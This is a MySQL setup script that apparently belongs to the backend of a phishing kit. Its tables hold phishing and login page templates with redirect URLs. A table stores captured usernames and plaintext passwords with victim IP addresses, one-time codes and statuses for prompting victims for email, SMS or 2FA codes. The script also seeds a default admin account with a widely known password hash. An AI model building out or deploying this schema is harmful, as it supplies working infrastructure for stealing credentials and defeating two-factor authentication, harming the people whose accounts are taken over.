USE read1;

-- This script is safe to run on an existing DB.
-- It only creates missing tables and inserts minimal seed data with INSERT IGNORE.

CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(100) UNIQUE NOT NULL,
  email VARCHAR(255) UNIQUE,
  password VARCHAR(255),
  password_hash VARCHAR(255),
  first_name VARCHAR(100) NULL,
  last_name VARCHAR(100) NULL,
  full_name VARCHAR(100) NULL,
  phone VARCHAR(50) NULL,
  avatar VARCHAR(500) NULL,
  bio TEXT NULL,
  balance DECIMAL(10,2) DEFAULT 0,
  points INT DEFAULT 0,
  is_active TINYINT(1) DEFAULT 1,
  is_admin TINYINT(1) DEFAULT 0,
  admin TINYINT(1) DEFAULT 0,
  email_verified TINYINT(1) DEFAULT 0,
  last_login TIMESTAMP NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_username (username),
  INDEX idx_email (email),
  INDEX idx_is_active (is_active),
  INDEX idx_is_admin (is_admin)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO users (id, username, email, password, password_hash, full_name, is_active, is_admin, admin)
VALUES (1, 'admin', 'admin@example.com', '$2b$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', '$2b$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'Administrator', 1, 1, 1);

CREATE TABLE IF NOT EXISTS websites (
  id INT AUTO_INCREMENT PRIMARY KEY,
  title VARCHAR(255) NOT NULL,
  description TEXT,
  slug VARCHAR(255) UNIQUE NOT NULL,
  redirect_url VARCHAR(500),
  temp1 TEXT,
  temp2 TEXT,
  thumbnail VARCHAR(500),
  language VARCHAR(10) DEFAULT 'en',
  domain VARCHAR(255),
  user_id INT NOT NULL DEFAULT 1,
  view_count INT DEFAULT 0,
  phishing_template_id INT NULL,
  login_template_id INT NULL,
  temp1_css TEXT NULL,
  temp1_js TEXT NULL,
  temp2_css TEXT NULL,
  temp2_js TEXT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_slug (slug),
  INDEX idx_user_id (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS account_list (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  password VARCHAR(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  website INT NOT NULL,
  user_id INT NOT NULL,
  ip_address VARCHAR(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  code VARCHAR(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  status ENUM('wrong-pass','otp-mail','otp-phone','otp-2fa','order-device','require-pass','require-mail','success') COLLATE utf8mb4_unicode_ci DEFAULT 'success',
  created_at TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_website (website),
  INDEX idx_user_id (user_id),
  INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS tools (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(100) NOT NULL,
  description TEXT,
  category ENUM('seo','development','design','analytics','productivity','other') DEFAULT 'other',
  status ENUM('active','inactive','maintenance') DEFAULT 'active',
  price DECIMAL(10,2) DEFAULT 0.00,
  points_cost INT DEFAULT 0,
  icon VARCHAR(500) DEFAULT '🔧',
  url VARCHAR(255),
  is_featured BOOLEAN DEFAULT FALSE,
  usage_count INT DEFAULT 0,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY unique_tool_name (name),
  INDEX idx_category (category),
  INDEX idx_status (status),
  INDEX idx_is_featured (is_featured),
  INDEX idx_usage_count (usage_count)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT IGNORE INTO tools (name, description, category, status, price, points_cost, icon, url, is_featured, usage_count) VALUES
('SEO Analyzer', 'Analyze your website SEO performance and get detailed recommendations', 'seo', 'active', 9.99, 100, '🔍', '/tools/seo-analyzer', TRUE, 1250),
('Code Generator', 'Generate code snippets for various programming languages', 'development', 'active', 19.99, 200, '💻', '/tools/code-generator', FALSE, 890),
('Image Optimizer', 'Optimize images for web performance without losing quality', 'design', 'active', 14.99, 150, '🖼️', '/tools/image-optimizer', TRUE, 2100),
('Text Summarizer', 'Summarize long texts automatically using AI', 'productivity', 'active', 7.99, 80, '📝', '/tools/text-summarizer', FALSE, 650),
('Analytics Dashboard', 'Create beautiful analytics dashboards with real-time data', 'analytics', 'active', 24.99, 250, '📊', '/tools/analytics-dashboard', TRUE, 420),
('Password Generator', 'Generate secure passwords with customizable options', 'productivity', 'active', 2.99, 30, '🔐', '/tools/password-generator', FALSE, 1800);

CREATE TABLE IF NOT EXISTS user_analytics (
  user_id INT PRIMARY KEY,
  balance DECIMAL(10,2) DEFAULT 0,
  total_balance DECIMAL(10,2) DEFAULT 0,
  tool_use_count INT DEFAULT 0,
  points INT DEFAULT 0,
  page_views INT DEFAULT 0,
  last_activity DATETIME NULL,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_last_activity (last_activity)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS ip_blacklist (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT NOT NULL,
  ip_address VARCHAR(45) NOT NULL,
  created_by INT NULL,
  reason VARCHAR(255) NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  UNIQUE KEY uniq_user_ip (user_id, ip_address),
  INDEX idx_user_id (user_id),
  INDEX idx_ip_address (ip_address)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
